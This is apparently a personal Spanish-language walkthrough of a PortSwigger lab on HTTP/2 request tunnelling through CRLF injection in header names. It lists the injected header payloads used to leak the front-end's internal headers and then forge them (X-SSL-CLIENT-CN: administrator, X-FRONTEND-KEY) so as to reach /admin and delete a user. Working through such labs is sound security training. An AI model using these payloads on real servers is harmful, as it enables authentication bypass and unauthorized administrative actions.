This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names. To solve the lab, access the admin panel at `/admin` as the `administrator` user and delete the user `carlos`.

The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks. However, it is still vulnerable to [request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling).

### Metodologia
Sacamos el updaate contetlength y nos aseguramos de que este http2. Agregamos una nueva cabecera para confirmar si es vulnerable a CRLF inyecion,
En la parte de value ponemos todo esto en la cabera
```
foo: bar
Host: eviltrust.net
```
Desde la perspectiva del front-end (HTTP2) aunque inyectemos nuevo body, sigue siendo parte de un header.
```Name
foo: bar
Content-Length: 20

search=
```
```value
qwerty
```
Pero en el momento que este rescribe la solicitud de HTTP2 a HTTP1.1 puede que interprete el doble crlf como un cuepo aparte
Como ya sabemos que search refleja el input, utilizamos el content-legnth para incluir la solicitud y que esta se vea reflejada
```Name
foo: bar
Content-Length: 150

search=
```
De esta forma vemos las cabeceras que agrega el front-end en el momento de la reescritura, "internal header", y podremos reutilizarlas. Al momento de enviar la request, no olvidarse del crlf del final, ya que este hace que los "internal headers" queden separados como una solicitud pendinete, o es directamente descartado como en el caso de "http  desync guardian" visto en [[SEQUEL is always worse 2021]].
```
X-SSL-VERIFIED: 0
X-SSL-CLIENT-CN: null
X-FRONTEND-KEY: 1947272484721117
```
Vamos a interceptar la página raíz, y agregamos 
```Name
foo: bar

GET /admin HTTP/1.1
Host: 0a0800bd03fa3ebd81a44d1900890039.web-security-academy.net
X-SSL-VERIFIED: 1
X-SSL-CLIENT-CN: administrator
X-FRONTEND-KEY: 1947272484721117


```
```Value
whatever
```
El output de la respuesta nos va a dar una pequeña pista, y es que recibe una cantidad de data más pequeña de lo que espera recibir:
"Server Error: Received only 417 of expected 8603 bytes of data"
así que cambiamos a método GET  a HEAD, para obtener el contenido de esto sin importar sus bytes.
Cambiano el path por Login, nos mostrará la url
```name
foo: bar

GET /admin/delete?username=carlos HTTP/1.1
Host: 0a0800bd03fa3ebd81a44d1900890039.web-security-academy.net
X-SSL-VERIFIED: 1
X-SSL-CLIENT-CN: administrator
X-FRONTEND-KEY: 1947272484721117


```
Nos dirá el mismo error de los bytes, pero si volvemos al lab veremos que aparece ya como "solved"